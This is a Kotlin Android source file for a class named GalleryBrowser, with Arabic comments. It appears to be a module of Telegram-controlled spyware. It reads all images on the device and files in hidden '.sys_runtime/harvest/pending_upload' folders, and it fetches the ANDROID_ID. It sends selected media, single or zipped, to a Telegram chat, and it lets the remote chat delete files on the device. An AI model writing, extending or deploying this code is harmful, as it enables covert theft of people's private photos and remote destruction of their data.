package com.example.app

import android.content.Context
import android.graphics.Bitmap
import android.media.MediaMetadataRetriever
import android.provider.MediaStore
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.security.MessageDigest
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * متصفح المعرض (GalleryBrowser) – فئة متطورة لاستعراض وتصنيف الوسائط.
 * تدعم:
 * - تقسيم الصفحات (Pagination) مع ترقيم صحيح للوسائط.
 * - عرض الصور والفيديوهات مع معاينة مصغرة للفيديو (مقتطعة من نقاط زمنية مختلفة).
 * - تحديد ملفات متعددة (اختيار).
 * - ضغط الملفات المحددة في أرشيف ZIP.
 * - تحميل الملفات المحددة (إرسالها إلى Telegram).
 * - تحديث الصفحة لعرض الوسائط الجديدة.
 * - أزرار تفاعلية مع إيموجيات مناسبة.
 * 
 * ✅ تم إصلاح تحديث لوحة المفاتيح عبر تخزين آخر message_id لكل دردشة.
 * ✅ تم دعم جميع الأوامر الجديدة (g_toggle, g_selall, g_zip, g_upload, g_del_sel, g_conf_del, g_conf_del_one).
 * ✅ تم إضافة مسح الكاش بعد عمليات التغيير.
 * ✅ تم تحسين معالجة الفيديو بإعادة ترتيب تحديث lastMessageIdMap واستخدام try-finally لحذف الصورة المصغرة.
 * ✅ تم تغيير مسار إنشاء ملفات ZIP المؤقتة إلى مجلد مخصص داخل .sys_runtime بدلاً من cacheDir.
 * ✅ تم دعم الأمر del القديم للتوافق مع الإصدارات السابقة.
 * ✅ تم جعل الدوال الموروثة (getGalleryByCategory, getDid, runScan, getPendingCount) مفتوحة (open) للسماح بالوراثة.
 * ✅ تم إضافة التحقق من null للـ telegram في showOptions و createZipArchive لتجنب NPE.
 * ✅ تم إضافة مسح الكاش (cachedFiles = null, cacheTimestamp = 0L) بعد عمليات toggle و selall لتجنب عرض بيانات قديمة.
 */
open class GalleryBrowser(
    private val context: Context,
    private val scanner: Any? = null,
    private val telegram: Any? = null
) {
    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val pageSize = 6
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ========== المسارات والمجلدات ==========
    // ✅ إضافة مجلد التشغيل الرئيسي لاستخدامه في تخزين الملفات المؤقتة
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    // ذاكرة مؤقتة للقائمة مع وقت انتهاء الصلاحية
    private var cachedFiles: List<Map<String, Any>>? = null
    private var cacheTimestamp: Long = 0L
    private val cacheTtlMs = 5000L // 5 ثوانٍ

    // تتبع الملفات المحددة (مؤقت لكل جلسة)
    private val selectedIndices = mutableSetOf<Int>()

    // تخزين آخر message_id لكل دردشة لتحديث لوحة المفاتيح
    private val lastMessageIdMap = mutableMapOf<Long, Long>()

    companion object {
        private const val TAG = "GalleryBrowser"

        @JvmStatic
        fun create(context: Context, scanner: Any? = null, telegram: Any? = null): GalleryBrowser {
            return GalleryBrowser(context, scanner, telegram)
        }
    }

    // ============================================================
    //  جلب الملفات من الجهاز مع التخزين المؤقت (مفتوحة للوراثة)
    // ============================================================

    open fun getGalleryByCategory(category: String, limit: Int): List<Map<String, Any>> {
        val ctx = appContext ?: return emptyList()

        val now = System.currentTimeMillis()
        if (cachedFiles != null && (now - cacheTimestamp) < cacheTtlMs) {
            return cachedFiles!!.take(limit)
        }

        val files = mutableListOf<File>()

        try {
            when (category) {
                "pending" -> {
                    val dirs = listOf(
                        File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
                        File(ctx.filesDir, ".sys_runtime/harvest/pending_upload")
                    )
                    dirs.forEach { dir ->
                        if (dir.exists()) {
                            dir.listFiles()?.forEach { file ->
                                if (file.isFile && file.length() > 0) {
                                    files.add(file)
                                }
                            }
                        }
                    }
                }
                "all" -> {
                    val projection = arrayOf(
                        MediaStore.Images.Media.DATA,
                        MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.SIZE,
                        MediaStore.Images.Media.DATE_MODIFIED,
                        MediaStore.Images.Media.MIME_TYPE
                    )
                    val sortOrder = "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
                    ctx.contentResolver.query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        null,
                        null,
                        sortOrder
                    )?.use { cursor ->
                        val dataIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                        val nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                        val sizeIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                        while (cursor.moveToNext()) {
                            val path = cursor.getString(dataIndex)
                            if (!path.isNullOrBlank()) {
                                val file = File(path)
                                if (file.exists()) {
                                    files.add(file)
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getGalleryByCategory error: ${e.message}")
        }

        files.sortByDescending { it.lastModified() }

        val result = files.map { file ->
            mapOf(
                "path" to file.absolutePath,
                "name" to file.name,
                "size" to file.length(),
                "hash" to fileHash(file),
                "timestamp" to (file.lastModified() / 1000),
                "type" to getFileType(file)
            )
        }

        cachedFiles = result
        cacheTimestamp = now
        return result.take(limit)
    }

    private fun getFileType(file: File): String {
        val name = file.name.lowercase()
        return when {
            name.endsWith(".jpg") || name.endsWith(".jpeg") ||
            name.endsWith(".png") || name.endsWith(".webp") ||
            name.endsWith(".bmp") || name.endsWith(".gif") -> "image"
            name.endsWith(".mp4") || name.endsWith(".avi") ||
            name.endsWith(".mov") || name.endsWith(".mkv") ||
            name.endsWith(".3gp") || name.endsWith(".webm") -> "video"
            name.endsWith(".mp3") || name.endsWith(".wav") ||
            name.endsWith(".aac") || name.endsWith(".m4a") -> "audio"
            else -> "other"
        }
    }

    private fun fileHash(file: File): String {
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            java.io.FileInputStream(file).use { fis ->
                val buffer = ByteArray(8192)
                var read: Int
                while (fis.read(buffer).also { read = it } != -1) {
                    md.update(buffer, 0, read)
                }
            }
            md.digest().joinToString("") { "%02x".format(it) }
        } catch (_: Exception) {
            file.name + file.length()
        }
    }

    open fun getPendingCount(): Int {
        val ctx = appContext ?: return 0
        val dirs = listOf(
            File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
            File(ctx.filesDir, ".sys_runtime/harvest/pending_upload")
        )
        return dirs.sumOf { dir -> dir.listFiles()?.filter { it.isFile }?.size ?: 0 }
    }

    // ============================================================
    //  تحديث معرف الرسالة (لتعديل لوحة المفاتيح لاحقاً)
    // ============================================================

    fun updateLastMessageId(chatId: Long, messageId: Long) {
        lastMessageIdMap[chatId] = messageId
        Log.d(TAG, "Updated lastMessageId for chat $chatId -> $messageId")
    }

    // ============================================================
    //  استخراج الصورة المصغرة للفيديو (مع إمكانية تحديد نقطة زمنية)
    // ============================================================

    /**
     * استخراج صورة مصغرة من الفيديو في نقطة زمنية محددة.
     * @param videoFile ملف الفيديو
     * @param timeUs الوقت بالميكروثانية (0 يعني البداية، -1 يعني المنتصف)
     * @return ملف الصورة المؤقتة أو null
     */
    private fun generateVideoThumbnail(videoFile: File, timeUs: Long = -1): File? {
        val ctx = appContext ?: return null
        val retriever = MediaMetadataRetriever()
        return try {
            retriever.setDataSource(videoFile.absolutePath)

            val actualTime = if (timeUs == -1L) {
                val duration = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION)?.toLongOrNull() ?: 0
                duration * 1000 / 2 // نصف المدة
            } else {
                timeUs
            }

            val bitmap = retriever.getFrameAtTime(actualTime, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)
            if (bitmap == null) return null

            val tempDir = File(ctx.cacheDir, "thumbnails")
            if (!tempDir.exists()) tempDir.mkdirs()
            val thumbFile = File(tempDir, "thumb_${System.currentTimeMillis()}_${videoFile.name}.jpg")
            FileOutputStream(thumbFile).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
            }
            bitmap.recycle()
            thumbFile
        } catch (e: Exception) {
            Log.e(TAG, "generateVideoThumbnail error: ${e.message}")
            null
        } finally {
            retriever.release()
        }
    }

    // ============================================================
    //  إنشاء أزرار شبكية (Inline Keyboard) مع ترقيم وتحديد
    // ============================================================

    fun getGridKb(category: String, page: Int): JSONObject {
        val allFiles = getGalleryByCategory(category, 100)
        val totalFiles = allFiles.size
        val totalPages = if (totalFiles > 0) (totalFiles + pageSize - 1) / pageSize else 1
        val safePage = page.coerceIn(0, (totalPages - 1).coerceAtLeast(0))

        val startIndex = safePage * pageSize
        val endIndex = (startIndex + pageSize).coerceAtMost(totalFiles)
        val pageFiles = if (startIndex < totalFiles) allFiles.subList(startIndex, endIndex) else emptyList()

        val keyboard = mutableListOf<List<Map<String, String>>>()
        var currentRow = mutableListOf<Map<String, String>>()

        for ((i, file) in pageFiles.withIndex()) {
            val globalIndex = startIndex + i
            val isSelected = selectedIndices.contains(globalIndex)
            val selectEmoji = if (isSelected) "☑️" else "⬜"
            val fileName = (file["name"] as? String)?.take(12) ?: "ملف"
            val fileType = file["type"] as? String ?: "other"
            val typeEmoji = when (fileType) {
                "image" -> "🖼️"
                "video" -> "🎬"
                "audio" -> "🎵"
                else -> "📄"
            }
            currentRow.add(
                mapOf(
                    "text" to "$selectEmoji $typeEmoji $fileName",
                    "callback_data" to "g_opt|$category|$safePage|$globalIndex"
                )
            )
            if (currentRow.size == 2) { // زرين في كل صف لزيادة مساحة العرض
                keyboard.add(currentRow)
                currentRow = mutableListOf()
            }
        }
        if (currentRow.isNotEmpty()) {
            keyboard.add(currentRow)
        }

        // أزرار التنقل
        val navRow = mutableListOf<Map<String, String>>()
        if (safePage > 0) {
            navRow.add(mapOf("text" to "⬅️", "callback_data" to "g_nav|$category|${safePage - 1}"))
        }
        navRow.add(mapOf("text" to "📄 ${safePage + 1}/$totalPages", "callback_data" to "g_nav|$category|$safePage"))
        if (safePage < totalPages - 1) {
            navRow.add(mapOf("text" to "➡️", "callback_data" to "g_nav|$category|${safePage + 1}"))
        }
        keyboard.add(navRow)

        // أزرار الإجراءات
        val actionRow = mutableListOf<Map<String, String>>()
        actionRow.add(mapOf("text" to "🔄 تحديث", "callback_data" to "g_nav|$category|$safePage"))
        val selectAllText = if (pageFiles.isNotEmpty() && pageFiles.all { selectedIndices.contains(startIndex + pageFiles.indexOf(it)) }) {
            "✅ إلغاء الكل"
        } else {
            "☑️ تحديد الكل"
        }
        actionRow.add(mapOf("text" to selectAllText, "callback_data" to "g_selall|$category|$safePage"))
        keyboard.add(actionRow)

        // صف ثاني من الإجراءات (ضغط، تحميل، حذف المحدد)
        val actionRow2 = mutableListOf<Map<String, String>>()
        actionRow2.add(mapOf("text" to "📦 ضغط المحدد", "callback_data" to "g_zip|$category|$safePage"))
        actionRow2.add(mapOf("text" to "📤 تحميل المحدد", "callback_data" to "g_upload|$category|$safePage"))
        actionRow2.add(mapOf("text" to "🗑️ حذف المحدد", "callback_data" to "g_del_sel|$category|$safePage"))
        keyboard.add(actionRow2)

        // زر حذف الكل في الصفحة (مع تأكيد)
        keyboard.add(
            listOf(
                mapOf("text" to "⚠️ حذف الكل في الصفحة", "callback_data" to "g_conf_del|$category|$safePage")
            )
        )

        return JSONObject(mapOf("inline_keyboard" to keyboard))
    }

    // ============================================================
    //  عرض خيارات ملف محدد (معاينة، تحديد/إلغاء)
    // ============================================================

    fun showOptions(chatId: Long, category: String, pageStr: String, indexStr: String) {
        // ✅ التحقق من وجود telegram لتجنب NPE
        if (telegram == null) {
            Log.e(TAG, "Telegram instance is null, cannot show options")
            return
        }

        val page = pageStr.toIntOrNull() ?: 0
        val index = indexStr.toIntOrNull() ?: 0
        val files = getGalleryByCategory(category, 100)
        if (index !in files.indices) {
            Log.w(TAG, "File index out of bounds: $index")
            return
        }

        val fileInfo = files[index]
        val path = fileInfo["path"] as? String ?: return
        val file = File(path)
        if (!file.exists()) {
            Log.w(TAG, "File not found: $path")
            return
        }

        val fileType = getFileType(file)
        val isSelected = selectedIndices.contains(index)
        val selectText = if (isSelected) "✅ إلغاء التحديد" else "☑️ تحديد"

        // أزرار الخيارات
        val optionsKb = listOf(
            listOf(
                mapOf("text" to selectText, "callback_data" to "g_toggle|$category|$page|$index"),
                mapOf("text" to "🔙 رجوع", "callback_data" to "g_nav|$category|$page")
            ),
            listOf(
                mapOf("text" to "🗑️ حذف هذا الملف", "callback_data" to "g_conf_del_one|$category|$page|$index")
            )
        )
        val jsonKb = JSONObject(mapOf("inline_keyboard" to optionsKb)).toString()

        // إرسال الملف مع الأزرار وتحديث lastMessageIdMap
        when (fileType) {
            "image" -> {
                val response = invokeTelegramMethod(telegram, "sendPhoto", mapOf(
                    "chat_id" to chatId,
                    "caption" to "🖼️ ${file.name}",
                    "reply_markup" to jsonKb
                ), mapOf("photo" to file))
                updateLastMessageIdFromResponse(chatId, response)
            }
            "video" -> {
                // إرسال إشعار بأن الفيديو قيد التجهيز
                invokeTelegramMethod(telegram, "sendChatAction", mapOf(
                    "chat_id" to chatId,
                    "action" to "upload_video"
                ))
                // ✅ الإصلاح 1: إعادة ترتيب تنفيذ معالجة الفيديو
                // استخدام try-finally لضمان حذف الصورة المصغرة بعد تحديث lastMessageIdMap
                scope.launch {
                    var response: Any? = null
                    var thumbnail: File? = null
                    try {
                        thumbnail = generateVideoThumbnail(file, -1)
                        response = if (thumbnail != null) {
                            invokeTelegramMethod(telegram, "sendVideo", mapOf(
                                "chat_id" to chatId,
                                "caption" to "🎬 ${file.name}",
                                "reply_markup" to jsonKb,
                                "supports_streaming" to true
                            ), mapOf("video" to file, "thumb" to thumbnail))
                        } else {
                            invokeTelegramMethod(telegram, "sendVideo", mapOf(
                                "chat_id" to chatId,
                                "caption" to "🎬 ${file.name}",
                                "reply_markup" to jsonKb,
                                "supports_streaming" to true
                            ), mapOf("video" to file))
                        }
                        // تحديث lastMessageIdMap بعد نجاح الإرسال
                        updateLastMessageIdFromResponse(chatId, response)
                    } finally {
                        // حذف الصورة المصغرة في النهاية حتى في حالة حدوث استثناء
                        thumbnail?.delete()
                    }
                }
            }
            "audio" -> {
                val response = invokeTelegramMethod(telegram, "sendAudio", mapOf(
                    "chat_id" to chatId,
                    "caption" to "🎵 ${file.name}",
                    "reply_markup" to jsonKb
                ), mapOf("audio" to file))
                updateLastMessageIdFromResponse(chatId, response)
            }
            else -> {
                val response = invokeTelegramMethod(telegram, "sendDocument", mapOf(
                    "chat_id" to chatId,
                    "caption" to "📄 ${file.name}",
                    "reply_markup" to jsonKb
                ), mapOf("document" to file))
                updateLastMessageIdFromResponse(chatId, response)
            }
        }
    }

    // ============================================================
    //  تنفيذ الإجراءات (مع دعم message_id لتحديث لوحة المفاتيح)
    // ============================================================

    fun executeAction(
        chatId: Long,
        action: String,
        category: String,
        pageOrIndex: Any,
        subIndex: Any? = null,
        messageId: Long? = null   // معرف الرسالة التي تحتوي على لوحة المفاتيح (لتحديثها)
    ) {
        try {
            val files = getGalleryByCategory(category, 100).toMutableList()
            val page = pageOrIndex.toString().toIntOrNull() ?: 0

            when (action) {
                // تبديل تحديد ملف
                "toggle" -> {
                    val index = (subIndex?.toString() ?: pageOrIndex.toString()).toIntOrNull() ?: -1
                    if (index in files.indices) {
                        if (selectedIndices.contains(index)) {
                            selectedIndices.remove(index)
                        } else {
                            selectedIndices.add(index)
                        }
                        // ✅ مسح الكاش لتحديث البيانات المعروضة
                        cachedFiles = null
                        cacheTimestamp = 0L
                        updateKeyboard(chatId, category, page, messageId)
                    }
                }

                // تحديد الكل أو إلغاء الكل في الصفحة الحالية
                "selall" -> {
                    val startIndex = page * pageSize
                    val endIndex = (startIndex + pageSize).coerceAtMost(files.size)
                    val pageFiles = if (startIndex < files.size) files.subList(startIndex, endIndex) else emptyList()
                    if (pageFiles.isNotEmpty()) {
                        val allSelected = pageFiles.all { selectedIndices.contains(startIndex + pageFiles.indexOf(it)) }
                        if (allSelected) {
                            pageFiles.forEachIndexed { i, _ -> selectedIndices.remove(startIndex + i) }
                        } else {
                            pageFiles.forEachIndexed { i, _ -> selectedIndices.add(startIndex + i) }
                        }
                        // ✅ مسح الكاش لتحديث البيانات المعروضة
                        cachedFiles = null
                        cacheTimestamp = 0L
                        updateKeyboard(chatId, category, page, messageId)
                    }
                }

                // ضغط الملفات المحددة
                "zip" -> {
                    val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                    if (selectedFiles.isEmpty()) {
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "⚠️ لم يتم تحديد أي ملفات للضغط"
                        ))
                        return
                    }
                    scope.launch {
                        val zipFile = createZipArchive(selectedFiles)
                        if (zipFile != null) {
                            invokeTelegramMethod(telegram, "sendDocument", mapOf(
                                "chat_id" to chatId,
                                "caption" to "📦 أرشيف مضغوط (${selectedFiles.size} ملف)"
                            ), mapOf("document" to zipFile))
                            zipFile.delete()
                            // إلغاء التحديد بعد الضغط ومسح الكاش
                            selectedIndices.clear()
                            cachedFiles = null
                            cacheTimestamp = 0L
                            updateKeyboard(chatId, category, page, messageId)
                        } else {
                            invokeTelegramMethod(telegram, "sendMessage", mapOf(
                                "chat_id" to chatId, "text" to "❌ فشل إنشاء الأرشيف المضغوط"
                            ))
                        }
                    }
                }

                // تحميل الملفات المحددة (إرسالها كمجموعة)
                "upload" -> {
                    val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                    if (selectedFiles.isEmpty()) {
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "⚠️ لم يتم تحديد أي ملفات للتحميل"
                        ))
                        return
                    }
                    if (selectedFiles.size <= 3) {
                        selectedFiles.forEach { file ->
                            val fileType = getFileType(file)
                            val method = when (fileType) {
                                "image" -> "sendPhoto"
                                "video" -> "sendVideo"
                                "audio" -> "sendAudio"
                                else -> "sendDocument"
                            }
                            val params = mapOf("chat_id" to chatId, "caption" to "📤 ${file.name}")
                            invokeTelegramMethod(telegram, method, params, mapOf(
                                when (fileType) {
                                    "image" -> "photo"
                                    "video" -> "video"
                                    "audio" -> "audio"
                                    else -> "document"
                                } to file
                            ))
                        }
                        selectedIndices.clear()
                        cachedFiles = null
                        cacheTimestamp = 0L
                        updateKeyboard(chatId, category, page, messageId)
                    } else {
                        // ضغط أولاً ثم إرسال (مع إعلام المستخدم)
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "📦 عدد الملفات كبير، سيتم ضغطها ثم إرسالها..."
                        ))
                        executeAction(chatId, "zip", category, page, null, messageId)
                    }
                }

                // حذف الملفات المحددة
                "del_sel" -> {
                    val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                    if (selectedFiles.isEmpty()) {
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "⚠️ لم يتم تحديد أي ملفات للحذف"
                        ))
                        return
                    }
                    var deletedCount = 0
                    selectedFiles.forEach { if (it.exists() && it.delete()) deletedCount++ }
                    selectedIndices.clear()
                    cachedFiles = null
                    cacheTimestamp = 0L
                    updateKeyboard(chatId, category, page, messageId)
                    invokeTelegramMethod(telegram, "sendMessage", mapOf(
                        "chat_id" to chatId, "text" to "🗑️ تم حذف $deletedCount ملفاً"
                    ))
                }

                // حذف ملف واحد (متوافق مع del القديم و del_one الجديد)
                "del", "del_one" -> {
                    val index = (subIndex?.toString() ?: pageOrIndex.toString()).toIntOrNull() ?: -1
                    if (index in files.indices) {
                        val path = files[index]["path"] as? String
                        if (path != null) {
                            val file = File(path)
                            if (file.exists() && file.delete()) {
                                selectedIndices.remove(index)
                                cachedFiles = null
                                cacheTimestamp = 0L
                                updateKeyboard(chatId, category, page, messageId)
                                invokeTelegramMethod(telegram, "sendMessage", mapOf(
                                    "chat_id" to chatId, "text" to "✅ تم حذف الملف بنجاح"
                                ))
                            } else {
                                invokeTelegramMethod(telegram, "sendMessage", mapOf(
                                    "chat_id" to chatId, "text" to "❌ فشل حذف الملف"
                                ))
                            }
                        }
                    }
                }

                // حذف الكل في الصفحة (مع تأكيد)
                "del_page" -> {
                    val startIndex = page * pageSize
                    val endIndex = (startIndex + pageSize).coerceAtMost(files.size)
                    var deletedCount = 0
                    if (startIndex < files.size) {
                        for (i in startIndex until endIndex) {
                            val path = files[i]["path"] as? String
                            if (path != null) {
                                val file = File(path)
                                if (file.exists() && file.delete()) {
                                    deletedCount++
                                    selectedIndices.remove(i)
                                }
                            }
                        }
                        cachedFiles = null
                        cacheTimestamp = 0L
                        updateKeyboard(chatId, category, page, messageId)
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "🗑️ تم حذف $deletedCount ملفاً من الصفحة ${page + 1}"
                        ))
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Execute action error: ${e.message}")
            invokeTelegramMethod(telegram, "sendMessage", mapOf(
                "chat_id" to chatId, "text" to "❌ خطأ: ${e.message?.take(100)}"
            ))
        }
    }

    // ============================================================
    //  تحديث لوحة المفاتيح (مساعد)
    // ============================================================

    private fun updateKeyboard(
        chatId: Long,
        category: String,
        page: Int,
        messageId: Long?,
        text: String = "🖼️ معرض الوسائط"
    ) {
        val newKb = getGridKb(category, page)
        val actualMsgId = messageId ?: lastMessageIdMap[chatId]
        if (actualMsgId != null) {
            invokeTelegramMethod(telegram, "editMessageReplyMarkup", mapOf(
                "chat_id" to chatId,
                "message_id" to actualMsgId,
                "reply_markup" to newKb.toString()
            ))
        } else {
            val response = invokeTelegramMethod(telegram, "sendMessage", mapOf(
                "chat_id" to chatId,
                "text" to text,
                "reply_markup" to newKb.toString()
            ))
            updateLastMessageIdFromResponse(chatId, response)
        }
    }

    // ============================================================
    //  استخراج message_id من استجابة Telegram وتحديث الخريطة
    // ============================================================

    private fun updateLastMessageIdFromResponse(chatId: Long, response: Any?) {
        try {
            val result = (response as? Map<*, *>)?.get("result") as? Map<*, *>
            val newMsgId = (result?.get("message_id") as? Number)?.toLong()
            if (newMsgId != null) {
                lastMessageIdMap[chatId] = newMsgId
                Log.d(TAG, "Updated lastMessageId from response: chat=$chatId, msgId=$newMsgId")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to extract message_id from response: ${e.message}")
        }
    }

    // ============================================================
    //  إنشاء أرشيف ZIP للملفات المحددة
    // ✅ الإصلاح: استخدام مجلد مخصص داخل .sys_runtime بدلاً من cacheDir
    // ✅ إضافة التحقق من appContext لتجنب NPE
    // ============================================================

    private fun createZipArchive(files: List<File>): File? {
        if (files.isEmpty()) return null
        // ✅ التحقق من وجود السياق
        val ctx = appContext ?: return null

        // ✅ إنشاء مجلد مؤقت داخل .sys_runtime لضمان توفر مساحة كافية
        val tempDir = File(runtimeDir, "temp_archives")
        if (!tempDir.exists()) {
            tempDir.mkdirs()
        }

        val zipFile = File(tempDir, "archive_${System.currentTimeMillis()}.zip")
        return try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                val buffer = ByteArray(8192)
                files.forEach { file ->
                    if (file.exists()) {
                        java.io.FileInputStream(file).use { fis ->
                            val entry = ZipEntry(file.name)
                            zos.putNextEntry(entry)
                            var len: Int
                            while (fis.read(buffer).also { len = it } > 0) {
                                zos.write(buffer, 0, len)
                            }
                            zos.closeEntry()
                        }
                    }
                }
            }
            if (zipFile.length() > 0) zipFile else null
        } catch (e: Exception) {
            Log.e(TAG, "createZipArchive error: ${e.message}")
            zipFile.delete()
            null
        }
    }

    // ============================================================
    //  دوال مساعدة للاتصال عبر الانعكاس
    // ============================================================

    private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>, files: Map<String, File>? = null): Any? {
        if (tg == null) return null
        return try {
            val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
            apiMethod?.isAccessible = true

            // تحويل reply_markup إلى String إذا كان Map
            val cleanParams = params.mapValues { (key, value) ->
                if (key == "reply_markup" && value is Map<*, *>) {
                    JSONObject(value as Map<*, *>).toString()
                } else {
                    value
                }
            }

            if (files != null) {
                apiMethod?.invoke(tg, method, cleanParams, files)
            } else {
                apiMethod?.invoke(tg, method, cleanParams)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Telegram API invocation error ($method): ${e.message}")
            null
        }
    }

    // ============================================================
    //  دوال عامة (مفتوحة للوراثة)
    // ============================================================

    open fun getDid(): String {
        return try {
            val ctx = appContext ?: return "Unknown"
            val androidId = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )
            androidId ?: "Unknown"
        } catch (_: Exception) {
            "Unknown"
        }
    }

    open fun runScan(initial: Boolean) {
        Log.d(TAG, "runScan called with initial=$initial")
        cachedFiles = null
        cacheTimestamp = 0L
    }

    // ============================================================
    //  دوال إضافية للتحكم في التحديد
    // ============================================================

    fun clearSelection() {
        selectedIndices.clear()
    }

    fun getSelectedCount(): Int = selectedIndices.size
}
